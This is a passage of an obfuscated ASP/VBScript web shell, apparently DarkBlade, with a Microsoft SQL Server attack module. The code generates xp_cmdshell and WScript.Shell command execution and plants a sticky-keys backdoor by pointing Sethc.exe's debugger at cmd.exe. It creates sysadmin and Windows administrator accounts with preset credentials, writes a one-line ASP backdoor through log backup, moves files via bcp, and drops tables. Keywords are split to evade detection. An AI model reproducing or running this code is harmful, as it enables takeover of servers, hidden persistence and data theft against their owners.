gsj"button","","Generate","10%","onClick=""javascript:cfhn(accdbpath.value)""",""
jwwxg
iroyi
echo"</span><hr>"
If Err Then Err.clear
If vdgad<>""Then
otrj vdgad
Response.Cookies(wumm&"vdgad")=vdgad
Set rs=wannd("Ad"&rgc&"odb.Reco"&mchqr&"rdSet")
rs.Open "select @@version,db_name()",conn,1,1
If Err Then
ignq="access"
Err.clear
Set rs=Nothing
Set rs=wannd("Ad"&rgc&"odb.Reco"&mchqr&"rdSet")
rs.Open "select cstr('access')",conn,1,1
If Err Then
ignq="others"
Err.clear
End If
rs.Close
Set rs=Nothing
Else
mfm=rs(0)
oaquw=rs(1)
rs.close
ignq="mssql"
%>
<script language=vbscript>
Function rdhh(path)
Dim ythqo,vga,moupu
ythqo=snqsz(path,"\",True)
path=Mid(path,Len(ythqo)+2)
moupu=aiy(path,"\")
vga=snqsz(path,"\",False)
rdhh=Array(ythqo,vga,moupu)
End Function
Function uog(tboqk)
form2.npkn.value="exec ma"&aixd&"ster..xp_cmdshell '"&tboqk&"'"
End Function
Function awvn(vga)
Dim afo
afo=rdhh(vga)
form2.npkn.value="exec ma"&aixd&"ster..xp_regread '"&afo(0)&"','"&afo(1)&"','"&afo(2)&"'"
End Function
Function qhv(phghs)
form2.npkn.value="exec ma"&aixd&"ster..xp_dirtree '"&phghs&"',1,1"
End Function
Function eomg(enkuf,cnet,cmje)
If cmje=2 Then
form2.npkn.value="If object_id('dark_temp')is not null drop table dark_temp;create table dark_temp(aa nvarchar(4000));bulk insert dark_temp from'"&cnet&"'"
Else
form2.npkn.value="declare @a int;exec ma"&aixd&"ster..sp_oacre"&cky&"ate'WS"&qfmd&"cript.S"&oda&"hell',@a output;exec ma"&aixd&"ster..sp_oamet"&aoyhg&"hod @a,'run',null,'"&enkuf&" > "&cnet&"',0,'true'"
End If
End Function
Function nuotc(lsy,zpvq,xcnu,rsrh)
Select Case rsrh
Case 1
form2.npkn.value="exec ma"&aixd&"ster..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWA"&qwse&"RE\Microsoft\Jet\4.0\Engin"&xdkd&"es','SandBox"&gbca&"Mode','REG_DWORD',0"
Case 2
lsy=Replace(lsy,"""","""""")
form2.npkn.value="Select * From op"&xevwv&"enrowSet('Microsoft.Jet.OLEDB.4.0',';Database="&zpvq&"','select shell("""&lsy&" > "&xcnu&""")')"
Case 3
form2.npkn.value="If object_id('dark_temp')is not null drop table dark_temp;create table dark_temp(aa nvarchar(4000));bulk insert dark_temp from'"&xcnu&"'"
End Select
End Function
Function xggfk(ctsva,gupf)
form2.npkn.value="declare @a int;exec ma"&aixd&"ster..sp_oacre"&cky&"ate'Scrip"&dlbgc&"ting.Fi"&xxjzd&"leSystemObject',@a output;exec ma"&aixd&"ster..sp_oamet"&aoyhg&"hod @a,'CopyFile',null,'"&ctsva&"','"&gupf&"'"
End Function
Function wdhut(fpyy,lnv)
form2.npkn.value="exec ma"&aixd&"ster..xp_makecab 'C:\windows\temp\~098611.tmp','default',1,'"&fpyy&"';exec ma"&aixd&"ster..xp_unpackcab 'C:\windows\temp\~098611.tmp','"&snqsz(lnv,"\",False)&"',1,'"&aiy(lnv,"\")&"'"
End Function
Function nqi(lfkia,ays)
form2.npkn.value="Use ma"&aixd&"ster;dbcc adde"&tost&"xtEndedproc('"&lfkia&"','"&ays&"')"
End Function
Function yqa(eamd)
form2.npkn.value="Use ma"&aixd&"ster;dbcc dropextEndedproc('"&eamd&"')"
End Function
Function gad(ijsqx)
form2.npkn.value="EXEC ma"&aixd&"ster..sp_configure 'show advanced options',1;RECONFIGURE;EXEC ma"&aixd&"ster..sp_configure '"&ijsqx&"',1;RECONFIGURE"
End Function
Function vsa(qxd,gwbwx,alel)
Dim afo
afo=rdhh(qxd)
form2.npkn.value="exec ma"&aixd&"ster..xp_regwrite '"&afo(0)&"','"&afo(1)&"','"&afo(2)&"','"&gwbwx&"','"&alel&"'"
End Function
Function ppqzl(name,pass)
form2.npkn.value="exec ma"&aixd&"ster..sp_addlogin '"&name&"','"&pass&"';exec ma"&aixd&"ster..sp_addsrv"&eroxk&"rolemember '"&name&"','sysadmin'"
End Function
Function oiaj(name,pass)
form2.npkn.value="declare @a int;exec ma"&aixd&"ster..sp_oacre"&cky&"ate 'ScriptControl',@a output;exec ma"&aixd&"ster..sp_oase"&veqs&"tproperty @a,'language','VBScript';exec ma"&aixd&"ster..sp_oamet"&aoyhg&"hod @a,'addcode',null,'sub add():Set o=CreateObject(""Sh"&wzeok&"ell.Users""):Set u=o.create("""&name&"""):u.Cha"&blip&"ngePassword """&pass&""","""":u.setting(""AccountType"")=3:end sub';exec ma"&aixd&"ster..sp_oamet"&aoyhg&"hod @a,'run',null,'add'"
End Function
Function qag(mxn,ulkns,oaquw,aojz)
Select Case aojz
Case 1
form2.npkn.value="alter database "&oaquw&" Set recovery full;dump transaction "&oaquw&" with no_log;If object_id('dark_temp')is not null drop table dark_temp;create table dark_temp(aa sql_variant primary key)"
Case 2
form2.npkn.value="backup database "&oaquw&" to disk='C:\windows\temp\~098611.tmp' with init"
Case 3
form2.npkn.value="insert dark_temp values('"&Replace(mxn,"'","''")&"')"
Case 4
form2.npkn.value="backup log "&oaquw&" to disk='"&ulkns&"';drop table dark_temp"
End Select
End Function
Function wnckl(oaquw)
On Error Resume Next
Dim nspwd,wwmps
Set nspwd=new RegExp
nspwd.Global=True
nspwd.IgnoreCase=True
nspwd.MultiLine=True
nspwd.Pattern="(Database|Initial Catalog) *=[^;]+"
If nspwd.test(sqlForm.vdgad.value)Then
sqlForm.vdgad.value=xppp(nspwd.Replace(sqlForm.vdgad.value,"$1="&oaquw))
sqlForm.wkfvm="oyhh"
sqlForm.submit
Else
Window.alert("Can not get database name in connect string!")
End If
End Function
Function snqsz(str,eox,sef)
If str="" Or InStr(str,eox)<1 Then
snqsz=""
Exit Function
End If
If sef Then
snqsz=Left(str,InStr(str,eox)-1)
Else
snqsz=Left(str,InstrRev(str,eox)-1)
End If
End Function
Function aiy(str,eox)
If str="" Or InStr(str,eox)<1 Then
aiy=""
Exit Function
End If
aiy=Mid(str,InstrRev(str,eox)+Len(eox))
End Function
</script>
<%
End If
If wkfvm="evu"And npkn=""Then
If ignq="others"Then
npkn="select * from "&ouo
Else
npkn="select * from ["&ouo&"]"
End If
End If
tcpp "oyhh","","","","","Show Tables",""
echo"<br>"
pppf True
olisd"wkfvm","evu"
olisd"vdgad",vdgad
skkkw"100%"
If ignq="mssql"Then
mypdl 1
prj"<td colspan=3>Version : "&uhu(mfm)&"</td>"
jwwxg
jjjv="sysadmin|db_owner|public"
mypdl 0
echo"<td colspan=3>"
For Each strrole In Split(jjjv,"|")
If strrole="sysadmin"Then
rs.Open "select IS_SRVROLEMEMBER('"&strrole&"')",conn,1,1
Else
rs.Open "select IS_ROLEMEMBER('"&strrole&"')",conn,1,1
End If
If rs(0)=1 Then
echo "Current ServerRole : <font color='red'>"&strrole&"</font> "
rs.close
Exit For
End If
rs.close
Next
echo "| Switch Database : "
rs.Open "select name from ma"&aixd&"ster..sysdatabases",conn,1,1
rs.movefirst
Do While Not rs.eof
echo "<a href=javascript:wnckl('"&rs("name")&"')>"&rs("name")&"</a> | "
rs.movenext
Loop
echo"</td></tr>"
cdama
rs.close
Set rs=Nothing
End If
mypdl 1
doTd"Execute Sql","10%"
wdjc"npkn",npkn,5
ckzt"Submit","10%"
jwwxg
iroyi
xpor
If ignq="mssql"Then
echo"Functions : "
czw=Split("xp_cmd|xp_dir|xp_reg|xp_regw|wsexec|sbexec|fsocopy|makecab|addproc|delproc|enfunc|addlogin|addsys|logback|tvao|tgugh","|")
qieq=Split("xp_cmdshell|xp_dirtree|xp_regread|xp_regwrite|ws exec|sandbox exec|FSO copy|Cab copy|add procedure|del procedure|enable function|add sql user|add sys user|logbackup|saupfile|sadownfile","|")
For i=0 To UBound(czw)
echo"<a href='#' onClick=""javascript:aac("&czw(i)&")"" class='hidehref'>"&qieq(i)&"</a> | "
Next
echo"<br><br>"
usxip"xp_cmd",True
skkkw"100%"
mypdl 1
doTd"com"&ehk&"mand","10%"
gsj"text","tboqk","net us"&xpbp&"er","80%","",""
gsj"button","","Generate","10%","onClick=""javascript:uog(tboqk.value)""",""
jwwxg
iroyi
echo"</span>"
usxip"xp_dir",True
skkkw"100%"
mypdl 1
doTd"Path","10%"
gsj"text","phghs",vuv,"80%","",""
gsj"button","","Generate","10%","onClick=""javascript:qhv(phghs.value)""",""
jwwxg
iroyi
echo"</span>"
usxip"xp_reg",True
skkkw"100%"
mypdl 1
doTd"Path","10%"
gsj"text","xpregpath","HKEY_LOCAL_MACHINE\SYSTEM\Curren"&ghfkv&"tControlSet\Control\Compute"&bewvk&"rName\Compute"&bewvk&"rName\Compute"&bewvk&"rName","80%","",""
gsj"button","","Generate","10%","onClick=""javascript:awvn(xpregpath.value)""",""
jwwxg
iroyi
echo"</span>"
usxip"xp_regw",True
skkkw"100%"
mypdl 1
doTd"Path","10%"
gsj"text","qxd","HKEY_LOCAL_MACHINE\SOFTWA"&qwse&"RE\Microsoft\Windows "&gud&"NT\Cur"&rtcm&"rentVersion\Image File Execution Options\Sethc.exe\debugger","80%","","4"
jwwxg
mypdl 0
doTd"Type",""
gsj"text","gwbwx","REG_SZ","30%","",""
doTd"Value",""
gsj"text","alel","cmd.exe","40%","",""
gsj"button","","Generate","10%","onClick=""javascript:vsa(qxd.value,gwbwx.value,alel.value)""",""
jwwxg
iroyi
echo"</span>"
usxip"wsexec",True
skkkw"100%"
mypdl 1
doTd"com"&ehk&"mand","10%"
gsj"text","enkuf","cmd /c net us"&xpbp&"er","","","4"
jwwxg
mypdl 0
doTd"Temp File",""
gsj"text","cnet","C:\WINDOWS\Temp\~098611.tmp","50%","",""
doTd"Step","20%"
echo"<td width='10%'>"
arqt"cmje","100%",""
isbb 1,1
isbb 2,2
iesnd
echo"</td>"
gsj"button","","Generate","10%","onClick=""javascript:eomg(enkuf.value,cnet.value,cmje.value)""",""
jwwxg
iroyi
echo"</span>"
usxip"sbexec",True
skkkw"100%"
mypdl 1
doTd"com"&ehk&"mand","10%"
gsj"text","lsy","cmd /c net us"&xpbp&"er","","","5"
jwwxg
mypdl 0
doTd"Mdb Path",""
gsj"text","zpvq","C:\windows\syste"&fky&"m32\ias\ias.mdb","30%","",""
doTd"Temp File","10%"
gsj"text","xcnu","C:\WINDOWS\Temp\~098611.tmp","30%","",""
echo"<td width='10%'>Step "
arqt"rsrh","40px",""
isbb 1,1
isbb 2,2
isbb 3,3
iesnd
echo"</td>"
gsj"button","","Generate","10%","onClick=""javascript:nuotc(lsy.value,zpvq.value,xcnu.value,rsrh.value)""",""
jwwxg
iroyi
echo"</span>"
usxip"fsocopy",True
skkkw"100%"
mypdl 1
doTd"Source","10%"
gsj"text","ctsva","C:\WINDOWS\syste"&fky&"m32\cmd.exe","35%","",""
doTd"Target","10%"
gsj"text","gupf","C:\WINDOWS\syste"&fky&"m32\Sethc.exe","35%","",""
gsj"button","","Generate","10%","onClick=""javascript:xggfk(ctsva.value,gupf.value)""",""
jwwxg
iroyi
echo"</span>"
usxip"makecab",True
skkkw"100%"
mypdl 1
doTd"Source","10%"
gsj"text","fpyy","C:\WINDOWS\syste"&fky&"m32\cmd.exe","35%","",""
doTd"Target","10%"
gsj"text","lnv","C:\WINDOWS\syste"&fky&"m32\Sethc.exe","35%","",""
gsj"button","","Generate","10%","onClick=""javascript:wdhut(fpyy.value,lnv.value)""",""
jwwxg
iroyi
echo"</span>"
usxip"addproc",True
skkkw"80%%"
mypdl 1
doTd"Procedure","20%"
echo"<td width='20%'>"
arqt"lfkia","100%",""
isbb "xp_cmdshell","xp_cmdshell"
isbb "xp_dirtree","xp_dirtree"
isbb "xp_regread","xp_regread"
isbb "xp_regwrite","xp_regwrite"
isbb "sp_oacre"&cky&"ate","sp_oacre"&cky&"ate"
iesnd
doTd"DLL","20%"
echo"<td width='20%'>"
arqt"ays","100%",""
isbb "xp"&rctid&"log70.dll","xp"&rctid&"log70.dll"
isbb "xpstar.dll","xpstar.dll"
isbb "odsole70.dll","odsole70.dll"
iesnd
gsj"button","","Generate","20%","onClick=""javascript:nqi(lfkia.value,ays.value)""",""
jwwxg
iroyi
echo"</span>"
usxip"delproc",True
skkkw"40%"
mypdl 1
doTd"Procedure","30%"
echo"<td width='40%'>"
arqt"eamd","100%",""
isbb "xp_cmdshell","xp_cmdshell"
isbb "xp_dirtree","xp_dirtree"
isbb "xp_regread","xp_regread"
isbb "xp_regwrite","xp_regwrite"
isbb "sp_oacre"&cky&"ate","sp_oacre"&cky&"ate"
iesnd
echo"</td>"
gsj"button","","Generate","30%","onClick=""javascript:yqa(eamd.value)""",""
jwwxg
iroyi
echo"</span>"
usxip"enfunc",True
skkkw"40%"
mypdl 1
doTd"Function","30%"
echo"<td width='40%'>"
arqt"ijsqx","100%",""
isbb "xp_cmdshell","xp_cmdshell"
isbb "Ole Automation Procedures","sp_oacre"&cky&"ate"
isbb "Ad Hoc Distributed Queries","op"&xevwv&"enrowSet"
iesnd
echo"</td>"
gsj"button","","Generate","30%","onClick=""javascript:gad(ijsqx.value)""",""
jwwxg
iroyi
echo"</span>"
usxip"addlogin",True
skkkw"80%"
mypdl 1
doTd"Username","10%"
gsj"text","addusername","Bloodsword$","30%","",""
doTd"Password","10%"
gsj"text","adduserpass","0kee","30%","",""
gsj"button","","Generate","20%","onClick=""javascript:ppqzl(addusername.value,adduserpass.value)""",""
jwwxg
iroyi
echo"</span>"
usxip"addsys",True
skkkw"80%"
mypdl 1
doTd"Username","10%"
gsj"text","sysname","Bloodsword$","30%","",""
doTd"Password","10%"
gsj"text","syspass","0kee","30%","",""
gsj"button","","Generate","20%","onClick=""javascript:oiaj(sysname.value,syspass.value)""",""
jwwxg
iroyi
echo"</span>"
usxip"logback",True
skkkw"100%"
mypdl 1
doTd"Content","10%"
echo"<td colspan='4'>"
bgr"mxn","<%response.clear:execute request(""value""):response.End%"&">","100%",5,""
echo"</td>"
gsj"button","","Generate","10%","onClick=""javascript:qag(mxn.value,ulkns.value,logdb.value,logstep.value)""",""
jwwxg
mypdl 0
doTd"Path","10%"
gsj"text","ulkns",iiju(".")&"\system.asp","40%","",""
doTd"Database","10%"
gsj"text","logdb",oaquw,"20%","",""
doTd"Step","10%"
echo"<td width='10%'>"
arqt"logstep","100%",""
isbb 1,1
isbb 2,2
isbb 3,3
isbb 4,4
iesnd
echo"</td>"
jwwxg
iroyi
echo"</span>"
usxip"tvao",True
prj"<form method=""post"" id=""saform""action="""&crk&"""enctype=""multipart/form-data"">"
olisd"goaction",goaction
olisd"wkfvm","tvao"
olisd"vdgad",vdgad
skkkw"100%"
mypdl 1
gsj"file","ndt","","30%","",""
prj"<td align='right'>Save as(full path):</td>"
gsj"text","wjiy","","40%","",""
gsj"button","","Upload","10%","onClick=""javascript:xzs('"&goaction&"','ndt','')""",""
jwwxg
iroyi
xpor
echo"</span>"
usxip"tgugh",True
pppf True
olisd"wkfvm","tgugh"
olisd"vdgad",vdgad
skkkw"100%"
mypdl 1
doTd"Remoto file(full path)",""
gsj"text","ekemb","","30%","",""
doTd"Save as",""
gsj"text","wjiy",vuv,"30%","",""
ckzt"Download","10%"
jwwxg
iroyi
xpor
echo"</span>"
End If
echo"<hr>"
End If
End Sub
Sub zzx()
If Not gdzvu Then On Error Resume Next
If ignq<>"others" Then ouo="["&ouo&"]"
conn.Execute"drop table "&ouo,-1,&H0001
If Err Then
byv(Err)
Else
jdvsp("Table deleted.")
End If
oyhh()
End Sub
Sub eow()
If Not gdzvu Then On Error Resume Next
If ignq<>"others" Then ouo="["&ouo&"]"
Dim rs
Set rs=conn.Execute("select * from "&ouo,-1,&H0001)
jplxa(Err)
If rs.Fields.Count>0 Then
Response.Clear
Session.CodePage=936
Response.AddHeader"Content-Disposition","Attachment; Filename="&ouo&".xls"
Session.CodePage=65001
Response.AddHeader"Content-Type","application / ms - excel"
echo"<table border=1><tr>"
For i=0 To rs.Fields.Count-1
echo"<td><b>"&rs.Fields(i).Name&"</b></td>"
Next
echo"</tr>"
Do Until rs.EOF
echo"<tr>"
For i=0 To rs.Fields.Count-1
echo"<td>"&uhu(rs(i))&"</td>"
Next
echo"</tr>"
rs.MoveNext
Loop
echo"</table>"
Else
jdvsp"It's empty."
oyhh()
okxls
End If
rs.Close
Set rs=Nothing
response.End
End Sub
Sub ndt()
xyw="8.0|1|1       SQLIMAGE      0       {size}       """"                        1     binfile     """"|"
conn.execute "If object_id('dark_temp')is not null drop table dark_temp"
If InStr(mfm,"Microsoft SQL Server 2005")>0 Then
xyw=Replace(xyw,"8.0","9.0")
conn.execute("EXEC ma"&aixd&"ster..sp_configure 'show advanced options', 1;RECONFIGURE;EXEC ma"&aixd&"ster..sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
End If
If wkfvm="tgugh"Then
Dim rs,size
If wjiy=""Or ekemb="" Then
jdvsp"Not enough parameters."
oyhh()
okxls
ElseIf InstrRev(ekemb,".")<InstrRev(ekemb,"\")Then
jdvsp"You can't download a folder -_-~!"
oyhh()
okxls
ElseIf InstrRev(wjiy,".")<InstrRev(wjiy,"\")Then
wjiy=wjiy&"\"&aiy(ekemb,"\")
End If
Set rs=wannd("Ad"&rgc&"odb.Reco"&mchqr&"rdSet")
Set rs=conn.execute("EXEC ma"&aixd&"ster..xp_cmdshell 'dir """&ekemb&""" | find """&aiy(ekemb,"\")&"""'",-1,&H0001)
rs.movefirst
size=Replace(Trim(cfv(rs(0)," [0-9,]+ ",False)(0)),",","")
If size=""Or Not IsNumeric(size)Then
jdvsp("Get size error.")
okxls
End If
xyw=Replace(xyw,"{size}",size)
rs.Close
Set rs=Nothing
Else
xyw=Replace(xyw,"{size}",0)
End If
jyr=Split(xyw,"|")
For Each substrfrm In jyr
conn.execute("EXEC ma"&aixd&"ster..xp_cmdshell 'echo "&substrfrm&" >>c:\tmp.fmt'")
Next
If wkfvm="tvao"Then
porwu()
Else
qlb()
End If
conn.execute "If object_id('dark_temp')is not null drop table dark_temp"
conn.execute("EXECUTE ma"&aixd&"ster..xp_cmdshell 'del c:\tmp.fmt'")
oyhh()
End Sub
Sub porwu()
If Not gdzvu Then On Error Resume Next
Dim rs,theFile,jyr,egbdi
If wjiy="" Then wjiy=vuv
If InStr(wjiy,":")<1 Then wjiy=vuv&"\"&wjiy
Set theFile=ars.File("ndt")
If InstrRev(wjiy,"\")>InstrRev(wjiy,".")Then wjiy=wjiy&"\"&theFile.FileName
conn.execute "CREATE TABLE [dark_temp] ([id] [int] NULL ,[binfile] [Image] NULL) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY];"
Set rs=wannd("Ad"&rgc&"odb.Reco"&mchqr&"rdSet")
rs.Open "SELECT * FROM dark_temp where id is null",conn,1,3
rs.AddNew
rs("binfile").AppendChunk theFile.mzn()
rs.Update
conn.execute("exec ma"&aixd&"ster..xp_cmdshell'bcp ""select binfile from "&oaquw&"..dark_temp"" queryout """&wjiy&""" -T -f c:\tmp.fmt'")
set rs=conn.execute("EXECUTE ma"&aixd&"ster..xp_fileexist '"&wjiy&"'")
If Err Then
byv(Err)
ElseIf rs(0)=1 Then 
jdvsp("File uploaded, have fun.")
Else
jdvsp("Upload failed, RPWT?")
End If
rs.close
Set rs=Nothing
End Sub
Sub qlb()
Dim rs
If Not gdzvu Then On Error Resume Next
conn.execute "CREATE TABLE [dark_temp] ([binfile] [Image] NULL)"
conn.execute("exec ma"&aixd&"ster..xp_cmdshell'bcp """&oaquw&"..dark_temp"" in """&ekemb&""" -T -f c:\tmp.fmt'")
Set rs=wannd("Ad"&rgc&"odb.Reco"&mchqr&"rdSet")
rs.Open "select * from dark_temp",conn,1,1
ewi wjiy,rs(0),1
If Err Then
byv(Err)
Else
jdvsp("File downloaded,have fun.")
End If
rs.close
Set rs=Nothing
End Sub
Sub oyhh()
Dim sbooo,zmo,nldd,wqjsp,jplxo,mnxu
If Not gdzvu Then On Error Resume Next
jplxo=1
mtz=0
Set mnxu=conn.OpenSchema(20,Array(Empty,Empty,Empty,"table"))
jplxa(Err)
Do Until mnxu.Eof
cvdty jplxo
zlpp"<b>"&mnxu("Table_Name")&"</b>"
echo"<label>"
tcpp "evu","","",mnxu("Table_Name"),"","Show content",""
echo"</label>"
echo"<label>"
tcpp "showStructure","","",mnxu("Table_Name"),"","Show structure",""
echo"</label>"
echo"<label>"
tcpp "eow","","",mnxu("Table_Name"),"","Export",""
echo"</label>"
echo"<label>"
tcpp "zzx","","",mnxu("Table_Name"),"","Delete",""
echo"</label>"
If wkfvm="showStructure"And ouo=mnxu("Table_Name")Then
Set rsColumn=conn.OpenSchema(4,Array(Empty,Empty,mnxu("Table_Name").value))
echo"<span>"
echo"<center>"
skkkw"80%"
mypdl mtz
cdama
doTd"Name",""
doTd"Type",""
doTd"Size",""
doTd"Nullable",""
jwwxg
Do Until rsColumn.Eof
nldd=rsColumn("Character_Maximum_Length")
If nldd="" Then nldd=rsColumn("Is_Nullable")
mypdl mtz
doTd rsColumn("Column_Name"),""
doTd iscie(rsColumn("Data_Type")),""
doTd nldd,""
doTd rsColumn("Is_Nullable"),""
jwwxg
cdama
rsColumn.MoveNext
Loop
iroyi
echo"</center></span>"
End If
prj"<br></span>"
cdama
jplxo=jplxo+1
If jplxo=2 Then jplxo=0
mnxu.MoveNext
Loop
Set mnxu=Nothing
Set rsColumn=Nothing
byv(Err)
End Sub
Sub evu()
Dim i,j,x,rs,Cat,tvb,bjye,vtyjq,oooeu
If Not gdzvu Then On Error Resume Next
Set Cat=wannd("ADOX.Catalog")
Cat.ActiveConnection=conn.ConnectionString
Set rs=wannd("Ad"&rgc&"odb.Reco"&mchqr&"rdSet")
If Lcase(Left(npkn,7))="select " And ignq<>"others" Then
If lrmn=""Then lrmn=1
rs.Open npkn,conn,1,1
jplxa(Err)
lrmn=CInt(lrmn)
rs.PageSize=zphr
If Not rs.Eof Then
rs.AbsolutePage=lrmn
End If
If rs.Fields.Count > 0 Then
echo"<table width='100%' cellspacing='0' border='0' style='border-width:0px;border-collapse:collapse;'>"
mypdl 1
For j=0 To rs.Fields.Count-1
agb uhu(rs.Fields(j).Name)
Next
jwwxg
mtz=0
For i=1 To rs.PageSize
If rs.Eof Then Exit For
mypdl mtz
For j=0 To rs.Fields.Count-1
agb uhu(rs(j))
Next
jwwxg
cdama
rs.MoveNext
Next
End If
mypdl mtz
vtyjq=rs.RecordCount/zphr
If InStr(vtyjq,".")>0 Then vtyjq=Int(vtyjq)+1
echo"<td colspan="&rs.Fields.Count&">"
prj rs.RecordCount&" records in total,page "&vtyjq
tcpp "evu","","",ouo,"1","&laquo;",uhu(" ")
oooeu=""
If ouo=""Then oooeu=Replace(npkn,"'","\'")
For i=1 To vtyjq
If i=lrmn Then
echo uhu(" "&i&" ")
Else
echo uhu(" ")
tcpp "evu","",oooeu,ouo,i,i,uhu(" ")
End If
Next
echo uhu(" ")
tcpp "evu","",oooeu,ouo,vtyjq,"&raquo;",""
echo"</td>"
jwwxg
iroyi
rs.Close
Else
Set rs=conn.Execute(npkn,-1,&H0001)
jplxa(Err)
If rs.Fields.Count>0 Then
skkkw"100%"
mypdl 1
For i=0 To rs.Fields.Count-1
agb uhu(rs.Fields(i).Name)
Next
jwwxg
mtz=0
Do Until rs.EOF
mypdl mtz
For i=0 To rs.Fields.Count-1
agb uhu(rs(i))
Next
jwwxg
rs.MoveNext
cdama
Loop
iroyi
rs.Close
Else
jdvsp"Query got null recordSet."
End If
Set rs=Nothing
Set Cat=Nothing
End If
byv(Err)
End Sub
Sub otrj(vdgad)
If Not gdzvu Then On Error Resume Next
Set conn=wannd("Ad"&rgc&"odb.Conne"&ytwmf&"ction")
conn.Open vdgad
jplxa(Err)
End Sub
Sub jhbt()
If Not gdzvu Then On Error Resume Next
If IsObject(conn)Then
conn.Close
Set conn=Nothing
End If
End Sub
Function iscie(flag)
Dim str
Select Case flag
Case 0: str="EMPTY"
Case 2: str="SMALLINT"
Case 3: str="INTEGER"
Case 4: str="SINGLE"
Case 5: str="DOUBLE"
Case 6: str="CURRENCY"
Case 7: str="DATE"
Case 8: str="BSTR"
Case 9: str="IDISPATCH"
Case 10: str="ERROR"
Case 11: str="BIT"
Case 12: str="VARIANT"
Case 13: str="IUNKNOWN"
Case 14: str="DECIMAL"
Case 16: str="TINYINT"
Case 17: str="UNSIGNEDTINYINT"
Case 18: str="UNSIGNEDSMALLINT"
Case 19: str="UNSIGNEDINT"
Case 20: str="BIGINT"
Case 21: str="UNSIGNEDBIGINT"
Case 72: str="GUID"
Case 128: str="BINARY"
Case 129: str="CHAR"
Case 130: str="VARCHAR"
Case 131: str="NUMERIC"
Case 132: str="USERDEFINED"
Case 133: str="DBDATE"
Case 134: str="DBTIME"
Case 135: str="DBTIMESTAMP"
Case 136: str="CHAPTER"
Case 200: str="WCHAR"
Case 201: str="TEXT"
Case 202: str="NVARCHAR"
Case 203: str="NTEXT"
Case 204: str="VARBINARY"
Case 205: str="LONGVARBINARY"
Case Else: str=flag
End Select
iscie=str
End Function
Sub omt()
If Not gdzvu Then On Error Resume Next
Dim theFile,qpsw,crlct,zih
If Right(wjiy,1)="\"Then
jdvsp"Can't edit a directory!"
okxls
End If
crlct=snqsz(wjiy,"\",False)
pppf True
If goaction="bjz"And wkfvm="omt" Then
qpsw=luuh(wjiy)
Else
qpsw=ksfhb(wjiy)
End If
byv(Err)
bgr"aunk",qpsw,"100%","25",""
If wkfvm="uen" Then
olisd"wkfvm","kcbe"
Else
olisd"wkfvm","save"
End If
echo"Save as :"
vots"text","wjiy",wjiy,"60",""
echo" Encode:"
arqt"act","80px","onchange=""javascript:if(this.value!=''){xzs('"&goaction&"',this.value,'"&omrpv(wjiy)&"');}"""
isbb"omt","Default"
zih="<option value=""uen"" {$}>Utf-8</option>"
If wkfvm="uen" Then
zih=Replace(zih,"{$}","selected")
End If
echo zih
iesnd
echo" "
xzs"Save"
echo" "
vots"reSet","","ReSet","",""
echo" "
vots"button","clear","Clear","","onClick=""javascript:this.form.aunk.innerText=''"""
echo" "
vots"button","","Go back","","onClick=""javascript:xzs('"&goaction&"','','"&omrpv(crlct)&"')"""
xpor
byv(Err)
okxls
End Sub
Sub oubu()
If Not gdzvu Then On Error Resume Next
If goaction="bjz"And wkfvm="save" Then
pjby wjiy,aunk
Else
ewi wjiy,aunk,2
End If
If Err Then
byv(Err)
Else
jdvsp"File saved."
End If
End Sub
Sub rxs()
If Not gdzvu Then On Error Resume Next
Server.ScriptTimeOut=5000
If wjiy=""Then wjiy=dpqnl
If wjiy=""Then wjiy=vuv
If uhuv=""Then uhuv=iiju("DarkBlade.mdb")
If pswgc=""Then pswgc="fso"
uznjs"File Packer/Unpacker"
echo"<center>"
skkkw"100%"
mypdl 1
pppf True
doTd"File Pack","10%"
gsj"text","wjiy",wjiy,"30%","",""
prj"<td style=""width:50%;"">"
arqt"wkfvm","80px",""
isbb"kmulx","FSO"
isbb"bbn","UnFSO"
iesnd
echo" Pack as : "
vots"text","uhuv",uhuv,40,""
echo"</td>"
ckzt"Pack","10%"
jwwxg
mypdl 0
doTd"Exceptional folder",""
gsj"text","lkp",lkp,"30%","",""
echo"<td colspan=""2"">"
echo"Exceptional file type,split with | "
vots"text","ubg",ubg,40,""
echo"</td></tr>"
iroyi
xpor
echo"<hr>"
skkkw"100%"
mypdl 1
pppf True
olisd"wkfvm","byuqp"
doTd"Release to","10%"
gsj"text","wjiy",wjiy,"30%","",""
prj"<td> Mdb path : "
vots"text","uhuv",uhuv,40,""
echo"</td>"
ckzt"Unpack","10%"
xpor
jwwxg
iroyi
echo"</center>"
echo"<hr>Notice: Unpacking need FSO object,all files unpacked will be under target folder,replacing same named!"
Select Case wkfvm
Case"kmulx"
zep"fso"
Case"bbn"
zep"app"
Case"byuqp"
nix()
End Select
End Sub
Sub zep(pswgc)
If Not gdzvu Then On Error Resume Next
Dim rs,vdgad,vwert
Set rs=wannd("Ad"&rgc&"odb.Reco"&mchqr&"rdSet")
Set xbo=wannd("Ad"&rgc&"odb.St"&jgcbg&"ream")
Set vwert=wannd("ADOX.Catalog")
If InStr(uhuv,":\")<1 Then uhuv=iiju(uhuv)
yjcj=aiy(uhuv,"\")
vdgad=jwv(uhuv)
vwert.Create vdgad
otrj(vdgad)
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,strPath VarChar,binContent Image)")
jplxa Err
xbo.Open
xbo.Type=1
rs.Open"FileData",conn,3,3
yjcj=Lcase(yjcj)
lcsgr=Replace(yjcj,".mdb",".ldb")
If pswgc="fso"Then
puvgw wjiy,wjiy,rs,xbo
Else
ewvy wjiy,wjiy,rs,xbo
End If
rs.Close
jhbt
xbo.Close
Set rs=Nothing
Set xbo=Nothing
Set vwert=Nothing
If Err Then
byv(Err)
Else
jdvsp"Packing completed"
End If
End Sub
Sub puvgw(wjiy,odkb,rs,xbo)
If Not gdzvu Then On Error Resume Next
Dim usk,theFolder,ydqp,files
If Not(cfho.FolderExists(odkb))Then
jdvsp"Folder dosen't exists or access denied!"
okxls
End If
lkp=Lcase(lkp)
Set theFolder=cfho.GetFolder(odkb)
For Each usk In theFolder.Files
If Not(mox(aiy(usk.name,"."),"^("&ubg&")$") Or Lcase(usk.Name)=yjcj Or Lcase(usk.Name)=lcsgr)Then
rs.AddNew
rs("strPath")=Replace(usk.Path,wjiy&"\","")
execute "xbo.Loa"&ikfh&"dFromFile(usk.Path)"
rs("binContent")=xbo.Read()
rs.Update
End If
Next
For Each usk In theFolder.SubFolders
If Not mox(usk.name,"^("&lkp&")$")Then
puvgw wjiy,usk.Path,rs,xbo
End If
Next
Set files=Nothing
